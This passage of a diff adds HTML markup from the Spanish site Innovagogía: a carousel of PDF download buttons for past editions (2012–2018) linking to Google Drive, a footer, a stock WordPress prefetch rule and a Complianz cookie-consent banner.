+				<div class="elementor-widget-container">
+					<h4 class="elementor-heading-title elementor-size-default">Innovagogía 2018</h4>				</div>
+				</div>
+				<div class="elementor-element elementor-element-9e80b00 elementor-widget elementor-widget-button" data-id="9e80b00" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://drive.google.com/file/d/1bK0zceuR7Sf2UULutNt7uY3fFMgZbZ43/view" target="_blank">
+						<span class="elementor-button-content-wrapper">
+						<span class="elementor-button-icon">
+				<svg aria-hidden="true" class="e-font-icon-svg e-far-file-pdf" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M369.9 97.9L286 14C277 5 264.8-.1 252.1-.1H48C21.5 0 0 21.5 0 48v416c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V131.9c0-12.7-5.1-25-14.1-34zM332.1 128H256V51.9l76.1 76.1zM48 464V48h160v104c0 13.3 10.7 24 24 24h104v288H48zm250.2-143.7c-12.2-12-47-8.7-64.4-6.5-17.2-10.5-28.7-25-36.8-46.3 3.9-16.1 10.1-40.6 5.4-56-4.2-26.2-37.8-23.6-42.6-5.9-4.4 16.1-.4 38.5 7 67.1-10 23.9-24.9 56-35.4 74.4-20 10.3-47 26.2-51 46.2-3.3 15.8 26 55.2 76.1-31.2 22.4-7.4 46.8-16.5 68.4-20.1 18.9 10.2 41 17 55.8 17 25.5 0 28-28.2 17.5-38.7zm-198.1 77.8c5.1-13.7 24.5-29.5 30.4-35-19 30.3-30.4 35.7-30.4 35zm81.6-190.6c7.4 0 6.7 32.1 1.8 40.8-4.4-13.9-4.3-40.8-1.8-40.8zm-24.4 136.6c9.7-16.9 18-37 24.7-54.7 8.3 15.1 18.9 27.2 30.1 35.5-20.8 4.3-38.9 13.1-54.8 19.2zm131.6-5s-5 6-37.3-7.8c35.1-2.6 40.9 5.4 37.3 7.8z"></path></svg>			</span>
+									<span class="elementor-button-text">Descargar</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				</div>
+					</div>
+				</div>
+								</div>
+											<div class="swiper-slide" data-slide="4" role="group" aria-roledescription="slide" aria-label="4 of 6">
+							<div class="elementor-element elementor-element-05efdec e-flex e-con-boxed e-con e-child" data-id="05efdec" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+					<div class="e-con-inner">
+		<div class="elementor-element elementor-element-b1234a5 e-con-full e-flex e-con e-child" data-id="b1234a5" data-element_type="container">
+				<div class="elementor-element elementor-element-01e66f6 elementor-view-default elementor-widget elementor-widget-icon" data-id="01e66f6" data-element_type="widget" data-widget_type="icon.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-icon-wrapper">
+			<div class="elementor-icon">
+			<svg aria-hidden="true" class="e-font-icon-svg e-fas-file-pdf" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M181.9 256.1c-5-16-4.9-46.9-2-46.9 8.4 0 7.6 36.9 2 46.9zm-1.7 47.2c-7.7 20.2-17.3 43.3-28.4 62.7 18.3-7 39-17.2 62.9-21.9-12.7-9.6-24.9-23.4-34.5-40.8zM86.1 428.1c0 .8 13.2-5.4 34.9-40.2-6.7 6.3-29.1 24.5-34.9 40.2zM248 160h136v328c0 13.3-10.7 24-24 24H24c-13.3 0-24-10.7-24-24V24C0 10.7 10.7 0 24 0h200v136c0 13.2 10.8 24 24 24zm-8 171.8c-20-12.2-33.3-29-42.7-53.8 4.5-18.5 11.6-46.6 6.2-64.2-4.7-29.4-42.4-26.5-47.8-6.8-5 18.3-.4 44.1 8.1 77-11.6 27.6-28.7 64.6-40.8 85.8-.1 0-.1.1-.2.1-27.1 13.9-73.6 44.5-54.5 68 5.6 6.9 16 10 21.5 10 17.9 0 35.7-18 61.1-61.8 25.8-8.5 54.1-19.1 79-23.2 21.7 11.8 47.1 19.5 64 19.5 29.2 0 31.2-32 19.7-43.4-13.9-13.6-54.3-9.7-73.6-7.2zM377 105L279 7c-4.5-4.5-10.6-7-17-7h-6v128h128v-6.1c0-6.3-2.5-12.4-7-16.9zm-74.1 255.3c4.1-2.7-2.5-11.9-42.8-9 37.1 15.8 42.8 9 42.8 9z"></path></svg>			</div>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-22792f2 elementor-widget elementor-widget-heading" data-id="22792f2" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h4 class="elementor-heading-title elementor-size-default">Innovagogía 2016</h4>				</div>
+				</div>
+				<div class="elementor-element elementor-element-f1b6e5a elementor-widget elementor-widget-button" data-id="f1b6e5a" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://drive.google.com/file/d/1oyULUkti1Qt-ivmstWDQcwCztmemg_aY/view" target="_blank">
+						<span class="elementor-button-content-wrapper">
+						<span class="elementor-button-icon">
+				<svg aria-hidden="true" class="e-font-icon-svg e-far-file-pdf" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M369.9 97.9L286 14C277 5 264.8-.1 252.1-.1H48C21.5 0 0 21.5 0 48v416c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V131.9c0-12.7-5.1-25-14.1-34zM332.1 128H256V51.9l76.1 76.1zM48 464V48h160v104c0 13.3 10.7 24 24 24h104v288H48zm250.2-143.7c-12.2-12-47-8.7-64.4-6.5-17.2-10.5-28.7-25-36.8-46.3 3.9-16.1 10.1-40.6 5.4-56-4.2-26.2-37.8-23.6-42.6-5.9-4.4 16.1-.4 38.5 7 67.1-10 23.9-24.9 56-35.4 74.4-20 10.3-47 26.2-51 46.2-3.3 15.8 26 55.2 76.1-31.2 22.4-7.4 46.8-16.5 68.4-20.1 18.9 10.2 41 17 55.8 17 25.5 0 28-28.2 17.5-38.7zm-198.1 77.8c5.1-13.7 24.5-29.5 30.4-35-19 30.3-30.4 35.7-30.4 35zm81.6-190.6c7.4 0 6.7 32.1 1.8 40.8-4.4-13.9-4.3-40.8-1.8-40.8zm-24.4 136.6c9.7-16.9 18-37 24.7-54.7 8.3 15.1 18.9 27.2 30.1 35.5-20.8 4.3-38.9 13.1-54.8 19.2zm131.6-5s-5 6-37.3-7.8c35.1-2.6 40.9 5.4 37.3 7.8z"></path></svg>			</span>
+									<span class="elementor-button-text">Descargar</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				</div>
+					</div>
+				</div>
+								</div>
+											<div class="swiper-slide" data-slide="5" role="group" aria-roledescription="slide" aria-label="5 of 6">
+							<div class="elementor-element elementor-element-5ca74f1 e-flex e-con-boxed e-con e-child" data-id="5ca74f1" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+					<div class="e-con-inner">
+		<div class="elementor-element elementor-element-d0ff44f e-con-full e-flex e-con e-child" data-id="d0ff44f" data-element_type="container">
+				<div class="elementor-element elementor-element-d2b88eb elementor-view-default elementor-widget elementor-widget-icon" data-id="d2b88eb" data-element_type="widget" data-widget_type="icon.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-icon-wrapper">
+			<div class="elementor-icon">
+			<svg aria-hidden="true" class="e-font-icon-svg e-fas-file-pdf" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M181.9 256.1c-5-16-4.9-46.9-2-46.9 8.4 0 7.6 36.9 2 46.9zm-1.7 47.2c-7.7 20.2-17.3 43.3-28.4 62.7 18.3-7 39-17.2 62.9-21.9-12.7-9.6-24.9-23.4-34.5-40.8zM86.1 428.1c0 .8 13.2-5.4 34.9-40.2-6.7 6.3-29.1 24.5-34.9 40.2zM248 160h136v328c0 13.3-10.7 24-24 24H24c-13.3 0-24-10.7-24-24V24C0 10.7 10.7 0 24 0h200v136c0 13.2 10.8 24 24 24zm-8 171.8c-20-12.2-33.3-29-42.7-53.8 4.5-18.5 11.6-46.6 6.2-64.2-4.7-29.4-42.4-26.5-47.8-6.8-5 18.3-.4 44.1 8.1 77-11.6 27.6-28.7 64.6-40.8 85.8-.1 0-.1.1-.2.1-27.1 13.9-73.6 44.5-54.5 68 5.6 6.9 16 10 21.5 10 17.9 0 35.7-18 61.1-61.8 25.8-8.5 54.1-19.1 79-23.2 21.7 11.8 47.1 19.5 64 19.5 29.2 0 31.2-32 19.7-43.4-13.9-13.6-54.3-9.7-73.6-7.2zM377 105L279 7c-4.5-4.5-10.6-7-17-7h-6v128h128v-6.1c0-6.3-2.5-12.4-7-16.9zm-74.1 255.3c4.1-2.7-2.5-11.9-42.8-9 37.1 15.8 42.8 9 42.8 9z"></path></svg>			</div>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-a4f1f54 elementor-widget elementor-widget-heading" data-id="a4f1f54" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h4 class="elementor-heading-title elementor-size-default">Innovagogía 2014</h4>				</div>
+				</div>
+				<div class="elementor-element elementor-element-544ffc4 elementor-widget elementor-widget-button" data-id="544ffc4" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://drive.google.com/file/d/0Bw2Ce9zDtnSTWERCczVrSUZPZ2s/view?resourcekey=0-JM1KwA17a211J-g2q23ovA" target="_blank">
+						<span class="elementor-button-content-wrapper">
+						<span class="elementor-button-icon">
+				<svg aria-hidden="true" class="e-font-icon-svg e-far-file-pdf" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M369.9 97.9L286 14C277 5 264.8-.1 252.1-.1H48C21.5 0 0 21.5 0 48v416c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V131.9c0-12.7-5.1-25-14.1-34zM332.1 128H256V51.9l76.1 76.1zM48 464V48h160v104c0 13.3 10.7 24 24 24h104v288H48zm250.2-143.7c-12.2-12-47-8.7-64.4-6.5-17.2-10.5-28.7-25-36.8-46.3 3.9-16.1 10.1-40.6 5.4-56-4.2-26.2-37.8-23.6-42.6-5.9-4.4 16.1-.4 38.5 7 67.1-10 23.9-24.9 56-35.4 74.4-20 10.3-47 26.2-51 46.2-3.3 15.8 26 55.2 76.1-31.2 22.4-7.4 46.8-16.5 68.4-20.1 18.9 10.2 41 17 55.8 17 25.5 0 28-28.2 17.5-38.7zm-198.1 77.8c5.1-13.7 24.5-29.5 30.4-35-19 30.3-30.4 35.7-30.4 35zm81.6-190.6c7.4 0 6.7 32.1 1.8 40.8-4.4-13.9-4.3-40.8-1.8-40.8zm-24.4 136.6c9.7-16.9 18-37 24.7-54.7 8.3 15.1 18.9 27.2 30.1 35.5-20.8 4.3-38.9 13.1-54.8 19.2zm131.6-5s-5 6-37.3-7.8c35.1-2.6 40.9 5.4 37.3 7.8z"></path></svg>			</span>
+									<span class="elementor-button-text">Descargar</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				</div>
+					</div>
+				</div>
+								</div>
+											<div class="swiper-slide" data-slide="6" role="group" aria-roledescription="slide" aria-label="6 of 6">
+							<div class="elementor-element elementor-element-ae931cb e-flex e-con-boxed e-con e-child" data-id="ae931cb" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+					<div class="e-con-inner">
+		<div class="elementor-element elementor-element-fb66800 e-con-full e-flex e-con e-child" data-id="fb66800" data-element_type="container">
+				<div class="elementor-element elementor-element-2d37c8f elementor-view-default elementor-widget elementor-widget-icon" data-id="2d37c8f" data-element_type="widget" data-widget_type="icon.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-icon-wrapper">
+			<div class="elementor-icon">
+			<svg aria-hidden="true" class="e-font-icon-svg e-fas-file-pdf" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M181.9 256.1c-5-16-4.9-46.9-2-46.9 8.4 0 7.6 36.9 2 46.9zm-1.7 47.2c-7.7 20.2-17.3 43.3-28.4 62.7 18.3-7 39-17.2 62.9-21.9-12.7-9.6-24.9-23.4-34.5-40.8zM86.1 428.1c0 .8 13.2-5.4 34.9-40.2-6.7 6.3-29.1 24.5-34.9 40.2zM248 160h136v328c0 13.3-10.7 24-24 24H24c-13.3 0-24-10.7-24-24V24C0 10.7 10.7 0 24 0h200v136c0 13.2 10.8 24 24 24zm-8 171.8c-20-12.2-33.3-29-42.7-53.8 4.5-18.5 11.6-46.6 6.2-64.2-4.7-29.4-42.4-26.5-47.8-6.8-5 18.3-.4 44.1 8.1 77-11.6 27.6-28.7 64.6-40.8 85.8-.1 0-.1.1-.2.1-27.1 13.9-73.6 44.5-54.5 68 5.6 6.9 16 10 21.5 10 17.9 0 35.7-18 61.1-61.8 25.8-8.5 54.1-19.1 79-23.2 21.7 11.8 47.1 19.5 64 19.5 29.2 0 31.2-32 19.7-43.4-13.9-13.6-54.3-9.7-73.6-7.2zM377 105L279 7c-4.5-4.5-10.6-7-17-7h-6v128h128v-6.1c0-6.3-2.5-12.4-7-16.9zm-74.1 255.3c4.1-2.7-2.5-11.9-42.8-9 37.1 15.8 42.8 9 42.8 9z"></path></svg>			</div>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-0e740db elementor-widget elementor-widget-heading" data-id="0e740db" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h4 class="elementor-heading-title elementor-size-default">Innovagogía 2012</h4>				</div>
+				</div>
+				<div class="elementor-element elementor-element-8b46fd5 elementor-widget elementor-widget-button" data-id="8b46fd5" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://drive.google.com/file/d/1qstieWwGY8EAiWhvd3sFF7sx2arInUrn/view" target="_blank">
+						<span class="elementor-button-content-wrapper">
+						<span class="elementor-button-icon">
+				<svg aria-hidden="true" class="e-font-icon-svg e-far-file-pdf" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M369.9 97.9L286 14C277 5 264.8-.1 252.1-.1H48C21.5 0 0 21.5 0 48v416c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V131.9c0-12.7-5.1-25-14.1-34zM332.1 128H256V51.9l76.1 76.1zM48 464V48h160v104c0 13.3 10.7 24 24 24h104v288H48zm250.2-143.7c-12.2-12-47-8.7-64.4-6.5-17.2-10.5-28.7-25-36.8-46.3 3.9-16.1 10.1-40.6 5.4-56-4.2-26.2-37.8-23.6-42.6-5.9-4.4 16.1-.4 38.5 7 67.1-10 23.9-24.9 56-35.4 74.4-20 10.3-47 26.2-51 46.2-3.3 15.8 26 55.2 76.1-31.2 22.4-7.4 46.8-16.5 68.4-20.1 18.9 10.2 41 17 55.8 17 25.5 0 28-28.2 17.5-38.7zm-198.1 77.8c5.1-13.7 24.5-29.5 30.4-35-19 30.3-30.4 35.7-30.4 35zm81.6-190.6c7.4 0 6.7 32.1 1.8 40.8-4.4-13.9-4.3-40.8-1.8-40.8zm-24.4 136.6c9.7-16.9 18-37 24.7-54.7 8.3 15.1 18.9 27.2 30.1 35.5-20.8 4.3-38.9 13.1-54.8 19.2zm131.6-5s-5 6-37.3-7.8c35.1-2.6 40.9 5.4 37.3 7.8z"></path></svg>			</span>
+									<span class="elementor-button-text">Descargar</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				</div>
+					</div>
+				</div>
+								</div>
+								</div>
+		</div>
+					<div class="elementor-swiper-button elementor-swiper-button-prev" role="button" tabindex="0" aria-label="Anterior">
+				<svg aria-hidden="true" class="e-font-icon-svg e-eicon-chevron-left" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M646 125C629 125 613 133 604 142L308 442C296 454 292 471 292 487 292 504 296 521 308 533L604 854C617 867 629 875 646 875 663 875 679 871 692 858 704 846 713 829 713 812 713 796 708 779 692 767L438 487 692 225C700 217 708 204 708 187 708 171 704 154 692 142 675 129 663 125 646 125Z"></path></svg>			</div>
+			<div class="elementor-swiper-button elementor-swiper-button-next" role="button" tabindex="0" aria-label="Siguiente">
+				<svg aria-hidden="true" class="e-font-icon-svg e-eicon-chevron-right" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M696 533C708 521 713 504 713 487 713 471 708 454 696 446L400 146C388 133 375 125 354 125 338 125 325 129 313 142 300 154 292 171 292 187 292 204 296 221 308 233L563 492 304 771C292 783 288 800 288 817 288 833 296 850 308 863 321 871 338 875 354 875 371 875 388 867 400 854L696 533Z"></path></svg>			</div>
+					<div class="swiper-pagination"></div>
+						</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				</div>
+		
+		
+			</div>
+
+	
+</main>
+
+			<footer data-elementor-type="footer" data-elementor-id="601" class="elementor elementor-601 elementor-location-footer" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-6abc20a e-flex e-con-boxed e-con e-parent" data-id="6abc20a" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-2e92d80 elementor-widget elementor-widget-image" data-id="2e92d80" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+																<a href="https://www.innovagogia.es/">
+							<img width="411" height="139" src="https://www.innovagogia.es/wp-content/uploads/2025/07/Marca_Innovagogia_blanco.png" class="attachment-large size-large wp-image-602" alt="" srcset="https://www.innovagogia.es/wp-content/uploads/2025/07/Marca_Innovagogia_blanco.png 411w, https://www.innovagogia.es/wp-content/uploads/2025/07/Marca_Innovagogia_blanco-300x101.png 300w" sizes="(max-width: 411px) 100vw, 411px" />								</a>
+															</div>
+				</div>
+					</div>
+				</div>
+		<div class="elementor-element elementor-element-794248c e-flex e-con-boxed e-con e-parent" data-id="794248c" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+					<div class="e-con-inner">
+		<div class="elementor-element elementor-element-d20b236 e-con-full e-flex e-con e-child" data-id="d20b236" data-element_type="container">
+				<div class="elementor-element elementor-element-0c1d2cd elementor-icon-list--layout-inline elementor-align-left elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="0c1d2cd" data-element_type="widget" data-widget_type="icon-list.default">
+				<div class="elementor-widget-container">
+							<ul class="elementor-icon-list-items elementor-inline-items">
+							<li class="elementor-icon-list-item elementor-inline-item">
+										<span class="elementor-icon-list-text">Innovagogía 2026. Todos los derechos reservados.</span>
+									</li>
+						</ul>
+						</div>
+				</div>
+				</div>
+		<div class="elementor-element elementor-element-15e1097 e-con-full e-flex e-con e-child" data-id="15e1097" data-element_type="container">
+				<div class="elementor-element elementor-element-d3d9e74 elementor-icon-list--layout-inline elementor-align-right elementor-mobile-align-center elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="d3d9e74" data-element_type="widget" data-widget_type="icon-list.default">
+				<div class="elementor-widget-container">
+							<ul class="elementor-icon-list-items elementor-inline-items">
+							<li class="elementor-icon-list-item elementor-inline-item">
+											<a href="https://www.innovagogia.es/aviso-legal/" target="_blank">
+
+											<span class="elementor-icon-list-text">Aviso Legal</span>
+											</a>
+									</li>
+								<li class="elementor-icon-list-item elementor-inline-item">
+											<a href="https://www.innovagogia.es/politica-de-privacidad/" target="_blank">
+
+											<span class="elementor-icon-list-text">Privacidad</span>
+											</a>
+									</li>
+								<li class="elementor-icon-list-item elementor-inline-item">
+											<a href="https://www.innovagogia.es/politica-de-cookies/" target="_blank">
+
+											<span class="elementor-icon-list-text">Cookies</span>
+											</a>
+									</li>
+								<li class="elementor-icon-list-item elementor-inline-item">
+											<a href="https://www.indgenio.es/" target="_blank">
+
+											<span class="elementor-icon-list-text">Desarrollo web: Indgenio</span>
+											</a>
+									</li>
+						</ul>
+						</div>
+				</div>
+				</div>
+					</div>
+				</div>
+				</footer>
+		
+<script type="speculationrules">
+{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"\/*"},{"not":{"href_matches":["\/wp-*.php","\/wp-admin\/*","\/wp-content\/uploads\/*","\/wp-content\/*","\/wp-content\/plugins\/*","\/wp-content\/themes\/hello-elementor-child\/*","\/wp-content\/themes\/hello-elementor\/*","\/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
+</script>
+
+<!-- Consent Management powered by Complianz | GDPR/CCPA Cookie Consent https://wordpress.org/plugins/complianz-gdpr -->
+<div id="cmplz-cookiebanner-container"><div class="cmplz-cookiebanner cmplz-hidden banner-1 banner-a optin cmplz-bottom-right cmplz-categories-type-view-preferences" aria-modal="true" data-nosnippet="true" role="dialog" aria-live="polite" aria-labelledby="cmplz-header-1-optin" aria-describedby="cmplz-message-1-optin">
+	<div class="cmplz-header">
+		<div class="cmplz-logo"><img width="411" height="139" src="https://www.innovagogia.es/wp-content/uploads/2025/04/Marca_Innovagogia_V2.jpg" class="attachment-cmplz_banner_image size-cmplz_banner_image" alt="Innovagogía" decoding="async" srcset="https://www.innovagogia.es/wp-content/uploads/2025/04/Marca_Innovagogia_V2.jpg 411w, https://www.innovagogia.es/wp-content/uploads/2025/04/Marca_Innovagogia_V2-300x101.jpg 300w" sizes="(max-width: 411px) 100vw, 411px" /></div>
+		<div class="cmplz-title" id="cmplz-header-1-optin">Gestionar consentimiento</div>
+		<div class="cmplz-close" tabindex="0" role="button" aria-label="Cerrar ventana">
+			<svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="times" class="svg-inline--fa fa-times fa-w-11" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 352 512"><path fill="currentColor" d="M242.72 256l100.07-100.07c12.28-12.28 12.28-32.19 0-44.48l-22.24-22.24c-12.28-12.28-32.19-12.28-44.48 0L176 189.28 75.93 89.21c-12.28-12.28-32.19-12.28-44.48 0L9.21 111.45c-12.28 12.28-12.28 32.19 0 44.48L109.28 256 9.21 356.07c-12.28 12.28-12.28 32.19 0 44.48l22.24 22.24c12.28 12.28 32.2 12.28 44.48 0L176 322.72l100.07 100.07c12.28 12.28 32.2 12.28 44.48 0l22.24-22.24c12.28-12.28 12.28-32.19 0-44.48L242.72 256z"></path></svg>
+		</div>
+	</div>
+
+	<div class="cmplz-divider cmplz-divider-header"></div>
+	<div class="cmplz-body">
+		<div class="cmplz-message" id="cmplz-message-1-optin">Para ofrecer las mejores experiencias, utilizamos tecnologías como las cookies para almacenar y/o acceder a la información del dispositivo. El consentimiento de estas tecnologías nos permitirá procesar datos como el comportamiento de navegación o las identificaciones únicas en este sitio. No consentir o retirar el consentimiento, puede afectar negativamente a ciertas características y funciones.</div>
+		<!-- categories start -->
+		<div class="cmplz-categories">
+			<details class="cmplz-category cmplz-functional" >
+				<summary>
+						<span class="cmplz-category-header">
+							<span class="cmplz-category-title">Funcional</span>
+							<span class='cmplz-always-active'>
+								<span class="cmplz-banner-checkbox">
+									<input type="checkbox"
+										   id="cmplz-functional-optin"
+										   data-category="cmplz_functional"
+										   class="cmplz-consent-checkbox cmplz-functional"
+										   size="40"
+										   value="1"/>
+									<label class="cmplz-label" for="cmplz-functional-optin"><span class="screen-reader-text">Funcional</span></label>
+								</span>
+								Siempre activo							</span>
+							<span class="cmplz-icon cmplz-open">
+								<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"  height="18" ><path d="M224 416c-8.188 0-16.38-3.125-22.62-9.375l-192-192c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L224 338.8l169.4-169.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-192 192C240.4 412.9 232.2 416 224 416z"/></svg>
+							</span>
+						</span>
+				</summary>
+				<div class="cmplz-description">
+					<span class="cmplz-description-functional">El almacenamiento o acceso técnico es estrictamente necesario para el propósito legítimo de permitir el uso de un servicio específico explícitamente solicitado por el abonado o usuario, o con el único propósito de llevar a cabo la transmisión de una comunicación a través de una red de comunicaciones electrónicas.</span>
+				</div>
+			</details>
+
+			<details class="cmplz-category cmplz-preferences" >
+				<summary>
+						<span class="cmplz-category-header">
+							<span class="cmplz-category-title">Preferencias</span>
+							<span class="cmplz-banner-checkbox">
+								<input type="checkbox"
+									   id="cmplz-preferences-optin"
+									   data-category="cmplz_preferences"
+									   class="cmplz-consent-checkbox cmplz-preferences"
+									   size="40"
+									   value="1"/>
+								<label class="cmplz-label" for="cmplz-preferences-optin"><span class="screen-reader-text">Preferencias</span></label>
+							</span>
+							<span class="cmplz-icon cmplz-open">
+								<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"  height="18" ><path d="M224 416c-8.188 0-16.38-3.125-22.62-9.375l-192-192c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L224 338.8l169.4-169.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-192 192C240.4 412.9 232.2 416 224 416z"/></svg>
+							</span>
+						</span>
+				</summary>
+				<div class="cmplz-description">
+					<span class="cmplz-description-preferences">El almacenamiento o acceso técnico es necesario para la finalidad legítima de almacenar preferencias no solicitadas por el abonado o usuario.</span>
+				</div>
+			</details>
+
+			<details class="cmplz-category cmplz-statistics" >
+				<summary>
+						<span class="cmplz-category-header">
+							<span class="cmplz-category-title">Estadísticas</span>
+							<span class="cmplz-banner-checkbox">
+								<input type="checkbox"
+									   id="cmplz-statistics-optin"
+									   data-category="cmplz_statistics"
+									   class="cmplz-consent-checkbox cmplz-statistics"
+									   size="40"
+									   value="1"/>
+								<label class="cmplz-label" for="cmplz-statistics-optin"><span class="screen-reader-text">Estadísticas</span></label>
+							</span>
+							<span class="cmplz-icon cmplz-open">
+								<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"  height="18" ><path d="M224 416c-8.188 0-16.38-3.125-22.62-9.375l-192-192c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L224 338.8l169.4-169.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-192 192C240.4 412.9 232.2 416 224 416z"/></svg>
+							</span>
+						</span>
+				</summary>
+				<div class="cmplz-description">
+					<span class="cmplz-description-statistics">El almacenamiento o acceso técnico que es utilizado exclusivamente con fines estadísticos.</span>
+					<span class="cmplz-description-statistics-anonymous">El almacenamiento o acceso técnico que se utiliza exclusivamente con fines estadísticos anónimos. Sin un requerimiento, el cumplimiento voluntario por parte de tu proveedor de servicios de Internet, o los registros adicionales de un tercero, la información almacenada o recuperada sólo para este propósito no se puede utilizar para identificarte.</span>
+				</div>
+			</details>
+			<details class="cmplz-category cmplz-marketing" >
+				<summary>
+						<span class="cmplz-category-header">
+							<span class="cmplz-category-title">Marketing</span>
+							<span class="cmplz-banner-checkbox">
+								<input type="checkbox"
+									   id="cmplz-marketing-optin"
+									   data-category="cmplz_marketing"
+									   class="cmplz-consent-checkbox cmplz-marketing"
+									   size="40"
+									   value="1"/>
+								<label class="cmplz-label" for="cmplz-marketing-optin"><span class="screen-reader-text">Marketing</span></label>
+							</span>
+							<span class="cmplz-icon cmplz-open">
+								<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"  height="18" ><path d="M224 416c-8.188 0-16.38-3.125-22.62-9.375l-192-192c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L224 338.8l169.4-169.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-192 192C240.4 412.9 232.2 416 224 416z"/></svg>
+							</span>
+						</span>
+				</summary>
+				<div class="cmplz-description">
+					<span class="cmplz-description-marketing">El almacenamiento o acceso técnico es necesario para crear perfiles de usuario para enviar publicidad, o para rastrear al usuario en una web o en varias web con fines de marketing similares.</span>
+				</div>
+			</details>
+		</div><!-- categories end -->
+			</div>
+
+	<div class="cmplz-links cmplz-information">
+		<ul>
+			<li><a class="cmplz-link cmplz-manage-options cookie-statement" href="#" data-relative_url="#cmplz-manage-consent-container">Administrar opciones</a></li>
+			<li><a class="cmplz-link cmplz-manage-third-parties cookie-statement" href="#" data-relative_url="#cmplz-cookies-overview">Gestionar los servicios</a></li>
+			<li><a class="cmplz-link cmplz-manage-vendors tcf cookie-statement" href="#" data-relative_url="#cmplz-tcf-wrapper">Gestionar {vendor_count} proveedores</a></li>
+			<li><a class="cmplz-link cmplz-external cmplz-read-more-purposes tcf" target="_blank" rel="noopener noreferrer nofollow" href="https://cookiedatabase.org/tcf/purposes/" aria-label="Read more about TCF purposes on Cookie Database">Leer más sobre estos propósitos</a></li>
+		</ul>
+			</div>
+
+	<div class="cmplz-divider cmplz-footer"></div>
+
+	<div class="cmplz-buttons">
+		<button class="cmplz-btn cmplz-accept">Aceptar</button>
+		<button class="cmplz-btn cmplz-deny">Denegar</button>
+		<button class="cmplz-btn cmplz-view-preferences">Ver preferencias</button>
+		<button class="cmplz-btn cmplz-save-preferences">Guardar preferencias</button>
+		<a class="cmplz-btn cmplz-manage-options tcf cookie-statement" href="#" data-relative_url="#cmplz-manage-consent-container">Ver preferencias</a>
+			</div>
+
+	
+	<div class="cmplz-documents cmplz-links">
+		<ul>
+			<li><a class="cmplz-link cookie-statement" href="#" data-relative_url="">{title}</a></li>
+			<li><a class="cmplz-link privacy-statement" href="#" data-relative_url="">{title}</a></li>
+			<li><a class="cmplz-link impressum" href="#" data-relative_url="">{title}</a></li>
+		</ul>
+			</div>
+</div>
+</div>
+					<div id="cmplz-manage-consent" data-nosnippet="true"><button class="cmplz-btn cmplz-hidden cmplz-manage-consent manage-consent-1">Gestionar consentimiento</button>
+
+</div>		<style>
+			:root {
